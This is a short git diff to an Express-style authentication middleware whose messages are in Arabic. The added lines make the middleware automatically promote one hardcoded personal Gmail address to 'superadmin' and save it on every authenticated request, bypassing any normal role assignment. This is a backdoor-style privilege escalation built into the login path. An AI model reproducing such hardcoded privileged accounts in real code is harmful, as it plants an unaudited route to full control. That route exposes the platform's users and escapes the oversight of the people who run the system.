@@ -21,6 +21,12 @@ export const protect = asyncHandler(async (req, res, next) => {
       return res.status(401).json({ message: 'المستخدم غير موجود' });
     }
 
+    // ENSURE ROOT EMAIL GETS SUPERADMIN AUTOMATICALLY
+    if (user.email === 'ahmaded252a@gmail.com' && user.role !== 'superadmin') {
+      user.role = 'superadmin';
+      await user.save();
+    }
+
     if (user.status === 'banned') {
       return res.status(403).json({ message: 'حسابك محظور من دخول المنصة' });
     }
